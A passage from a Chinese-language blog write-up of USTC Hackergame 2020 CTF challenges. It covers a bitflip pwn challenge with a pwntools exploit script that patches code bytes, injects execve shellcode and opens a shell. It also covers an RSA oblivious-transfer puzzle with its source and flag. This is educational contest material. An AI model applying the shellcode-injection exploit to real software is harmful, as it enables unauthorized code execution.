<p>原题 writeup: <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/7894">https://ctftime.org/writeup/7894</a><br>此 Writeup 的思路总结如下：</p>
<ol>
<li>使程序循环运作</li>
<li>突破 mprotect 防御</li>
<li>绕过翻转比特 &lt;= 7 的限制</li>
<li>使左移运算无效</li>
<li>写入 shellcode、跳转到 shellcode 所在地址。</li>
</ol>
<p>经过我几个小时的调试， 总结思路如下：</p>
<ol>
<li>输入 <code>0x401296 6</code> 使程序循环 (这个纯粹是我 fuzz 出来的 www, 会使本来的 <code>call exit</code> 变成 <code>call _dl_relocate_static_pie</code>)</li>
<li>输入 <code>0x401260 6</code> 使 <code>cmp eax, 0x7</code> 变成 <code>cmp eax,0x47</code>，&lt;= 7 的比特翻转限制变成 &lt;= 71 了！</li>
<li>输入 <code>0x401279 1</code> 使 <code>shl edx, cl</code> 下一行 <code>mov eax, edx</code> 变成 <code>mov edx, edx</code> 使 left shift 无效。</li>
<li>输入 <code>0x401262 55</code> 使 <code>jg 0x40129a</code> 变成 <code>jg 0x401263</code> 使 cmp 检查无效，无论检查为真或假，都会继续执行下一行。</li>
<li>找到一个合适的位置写入 shellcode，<code>0x4011b6</code> 就挺不错的。由于地址内容不为空，所以需要 xor 它们本身的值来清除内容。</li>
<li>往 <code>0x4011b6</code> 写入 shellcode。</li>
<li>输入 <code>0x4012a7 78</code> 使循环用的 <code>jmp 0x4011f0</code> 变成 <code>jmp 0x4011b6</code> 跳转到 shellcode 所在位置。</li>
</ol>
<p>利用脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;-d&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">    context.log_level=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;-r&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">    s = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>, <span class="number">10231</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;&lt;token here ;3&gt;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = process(<span class="string">&#x27;./bitflip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./bitflip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">.4</span>)</span><br><span class="line">s.send(<span class="string">&#x27;0x401296 6&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)    </span><br><span class="line">log.info(<span class="string">&#x27;Binary looped!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">.4</span>)</span><br><span class="line">s.send(<span class="string">&#x27;0x401260 6&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)    </span><br><span class="line">log.info(<span class="string">&#x27;check &lt;= 7 become check &lt;= 71 , cmp eax,0x47&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">.4</span>)</span><br><span class="line">s.send(<span class="string">&#x27;0x401279 1&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)    </span><br><span class="line">log.info(<span class="string">&#x27;disable shifting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">.4</span>)</span><br><span class="line">s.send(<span class="string">&#x27;0x401262 55&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)    </span><br><span class="line">log.info(<span class="string">&#x27;jg 0x40129a --&gt; jg 0x401263 (bypassed cmp check)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">clear_content = <span class="string">&quot;\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\xba\x07\x00\x00\x00\xbe\x00\x10\x00\x00\xbf\x00\x10\x40\x00\xe8\xce\xfe\xff\xff\x90\x5d&quot;</span></span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4011b6</span>, <span class="number">0x4011b6</span>+<span class="built_in">len</span>(clear_content), <span class="number">1</span>):</span><br><span class="line">  byte = <span class="built_in">ord</span>(clear_content[pos])</span><br><span class="line">  s.send(<span class="string">&#x27;&#123;&#125; &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i), byte))</span><br><span class="line">  log.info(<span class="string">&#x27;Clearing &#123;&#125; at &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(byte),<span class="built_in">hex</span>(i)))</span><br><span class="line">  sleep(<span class="number">.4</span>)</span><br><span class="line">  pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90&quot;</span></span><br><span class="line">pos_shell = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4011b6</span>, <span class="number">0x4011d1</span>, <span class="number">1</span>):</span><br><span class="line">    byte=<span class="built_in">ord</span>(shellcode[pos_shell])</span><br><span class="line">    s.send(<span class="string">&#x27;&#123;&#125; &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i), byte))</span><br><span class="line">    log.info(<span class="string">&#x27;Writting &#123;&#125; at &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(byte),<span class="built_in">hex</span>(i)))</span><br><span class="line">    sleep(<span class="number">.4</span>)</span><br><span class="line">    pos_shell+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">s.send(<span class="string">&#x27;0x4012a7 78\n&#x27;</span>)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>

<p>即可 getshell, 执行 <code>cat flag</code> 即可获得 flag。</p>
<h2 id="不经意传输"><a href="#不经意传输" class="headerlink" title="不经意传输"></a>不经意传输</h2><h3 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h3><p>题目源码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    random = SystemRandom()</span><br><span class="line"></span><br><span class="line">    key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">&quot;n =&quot;</span>, key.n)</span><br><span class="line">    print(<span class="string">&quot;e =&quot;</span>, key.e)</span><br><span class="line"></span><br><span class="line">    m0 = <span class="built_in">int</span>.from_bytes(os.urandom(<span class="number">64</span>).<span class="built_in">hex</span>().encode(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    m1 = <span class="built_in">int</span>.from_bytes(os.urandom(<span class="number">64</span>).<span class="built_in">hex</span>().encode(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    x0 = random.randrange(key.n)</span><br><span class="line">    x1 = random.randrange(key.n)</span><br><span class="line">    print(<span class="string">&quot;x0 =&quot;</span>, x0)</span><br><span class="line">    print(<span class="string">&quot;x1 =&quot;</span>, x1)</span><br><span class="line"></span><br><span class="line">    v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;v = &quot;</span>))</span><br><span class="line">    m0_ = (m0 + <span class="built_in">pow</span>(v - x0, key.d, key.n)) % key.n</span><br><span class="line">    m1_ = (m1 + <span class="built_in">pow</span>(v - x1, key.d, key.n)) % key.n</span><br><span class="line">    print(<span class="string">&quot;m0_ =&quot;</span>, m0_)</span><br><span class="line">    print(<span class="string">&quot;m1_ =&quot;</span>, m1_)</span><br><span class="line"></span><br><span class="line">    guess0 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;m0 = &quot;</span>))</span><br><span class="line">    guess1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;m1 = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> guess0 == m0:</span><br><span class="line">        print(<span class="built_in">open</span>(<span class="string">&quot;flag1&quot;</span>).read())</span><br><span class="line">        <span class="keyword">if</span> guess1 == m1:</span><br><span class="line">            print(<span class="built_in">open</span>(<span class="string">&quot;flag2&quot;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Nope&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>易知 $v = x0$ 时 $m0_ = m0$ 或 $v = x1$ 时 $m1_ = m1$</p>
<p><img src="/img/post/image-20201121205238853.webp" alt="不经意传输 - 解密消息"></p>
<p>易得 flag1: <code>flag&#123;U_R_0n_Th3_ha1f_way_0f_succe55_w0rk_h4rder!_3bb495dd53&#125;</code></p>
</div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/USTC-Hackergame/">USTC Hackergame</a></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="https://www.buymeacoffee.com/ryougishiki" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/11/18/hello-world/"><span class="level-item">Hello World</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2.5/dist/disqusjs.css"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script src="https://cdn.jsdelivr.net/npm/disqusjs@1.2.5/dist/disqus.js"></script><script>new DisqusJS({
            shortname: 'hang333',
            apikey: "o7HksAJFHAEHpkjki4AFimc1XU7xHSsJ4Rj7DJTUcMOvX8IlcNJn4ZcK4xtICYdN",
            siteName: "hang333 Blog",
            identifier: "2020/11/21/ustc-hackergame-2020-writeup/",
            url: "https://hang333.moe/2020/11/21/ustc-hackergame-2020-writeup/",
            title: "USTC Hackergame 2020 Writeup",
            api: "https://disqus.skk.moe/disqus/",
            admin: "hang333",
            adminLabel: "Admin",
            nesting: 4,
        });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.webp" alt="hang333"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">hang333</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Malaysia</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">2</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/hang333" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/hang333"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com/hang333"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/TheJonathanGoh"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Instagram" href="https://instagram.com/TheJonathanGoh"><i class="fab fa-instagram"></i></a></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://blog.volltin.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Volltin&#039;s Blog</span></span><span class="level-right"><span class="level-item tag">blog.volltin.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/SECURITY/"><span class="level-start"><span class="level-item">SECURITY</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-11-21T10:00:00.000Z">21-11-2020</time></p><p class="title"><a href="/2020/11/21/ustc-hackergame-2020-writeup/">USTC Hackergame 2020 Writeup</a></p><p class="categories"><a href="/categories/SECURITY/">SECURITY</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-11-18T00:00:00.000Z">18-11-2020</time></p><p class="title"><a href="/2020/11/18/hello-world/">Hello World</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/USTC-Hackergame/"><span class="tag">USTC Hackergame</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#签到"><span class="level-left"><span class="level-item">1</span><span class="level-item">签到</span></span></a></li><li><a class="level is-mobile" href="#猫咪问答"><span class="level-left"><span class="level-item">2</span><span class="level-item">猫咪问答</span></span></a></li><li><a class="level is-mobile" href="#2048"><span class="level-left"><span class="level-item">3</span><span class="level-item">2048</span></span></a></li><li><a class="level is-mobile" href="#一闪而过的-Flag"><span class="level-left"><span class="level-item">4</span><span class="level-item">一闪而过的 Flag</span></span></a></li><li><a class="level is-mobile" href="#从零开始的记账工具人"><span class="level-left"><span class="level-item">5</span><span class="level-item">从零开始的记账工具人</span></span></a></li><li><a class="level is-mobile" href="#超简单的世界模拟器"><span class="level-left"><span class="level-item">6</span><span class="level-item">超简单的世界模拟器</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#蝴蝶效应"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">蝴蝶效应</span></span></a></li></ul></li><li><a class="level is-mobile" href="#从零开始的火星文生活"><span class="level-left"><span class="level-item">7</span><span class="level-item">从零开始的火星文生活</span></span></a></li><li><a class="level is-mobile" href="#自复读的复读机"><span class="level-left"><span class="level-item">8</span><span class="level-item">自复读的复读机</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#反向复读"><span class="level-left"><span class="level-item">8.1</span><span class="level-item">反向复读</span></span></a></li><li><a class="level is-mobile" href="#哈希复读"><span class="level-left"><span class="level-item">8.2</span><span class="level-item">哈希复读</span></span></a></li></ul></li><li><a class="level is-mobile" href="#233-同学的字符串工具"><span class="level-left"><span class="level-item">9</span><span class="level-item">233 同学的字符串工具</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#字符串大写工具"><span class="level-left"><span class="level-item">9.1</span><span class="level-item">字符串大写工具</span></span></a></li><li><a class="level is-mobile" href="#编码转换工具"><span class="level-left"><span class="level-item">9.2</span><span class="level-item">编码转换工具</span></span></a></li></ul></li><li><a class="level is-mobile" href="#233-同学的-Docker"><span class="level-left"><span class="level-item">10</span><span class="level-item">233 同学的 Docker</span></span></a></li><li><a class="level is-mobile" href="#从零开始的-HTTP-链接"><span class="level-left"><span class="level-item">11</span><span class="level-item">从零开始的 HTTP 链接</span></span></a></li><li><a class="level is-mobile" href="#来自一教的图片"><span class="level-left"><span class="level-item">12</span><span class="level-item">来自一教的图片</span></span></a></li><li><a class="level is-mobile" href="#超简陋的-OpenGL-小程序"><span class="level-left"><span class="level-item">13</span><span class="level-item">超简陋的 OpenGL 小程序</span></span></a></li><li><a class="level is-mobile" href="#生活在博弈树上"><span class="level-left"><span class="level-item">14</span><span class="level-item">生活在博弈树上</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#始终热爱大地"><span class="level-left"><span class="level-item">14.1</span><span class="level-item">始终热爱大地</span></span></a></li></ul></li><li><a class="level is-mobile" href="#超基础的数理模拟器"><span class="level-left"><span class="level-item">15</span><span class="level-item">超基础的数理模拟器</span></span></a></li><li><a class="level is-mobile" href="#超安全的代理服务器"><span class="level-left"><span class="level-item">16</span><span class="level-item">超安全的代理服务器</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#找到-Secret"><span class="level-left"><span class="level-item">16.1</span><span class="level-item">找到 Secret</span></span></a></li><li><a class="level is-mobile" href="#入侵管理中心"><span class="level-left"><span class="level-item">16.2</span><span class="level-item">入侵管理中心</span></span></a></li></ul></li><li><a class="level is-mobile" href="#超精准的宇宙射线模拟器"><span class="level-left"><span class="level-item">17</span><span class="level-item">超精准的宇宙射线模拟器</span></span></a></li><li><a class="level is-mobile" href="#不经意传输"><span class="level-left"><span class="level-item">18</span><span class="level-item">不经意传输</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#解密消息"><span class="level-left"><span class="level-item">18.1</span><span class="level-item">解密消息</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">hang333 Blog</a><p class="is-size-7"><span>&copy; 2020 hang333</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-sa"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>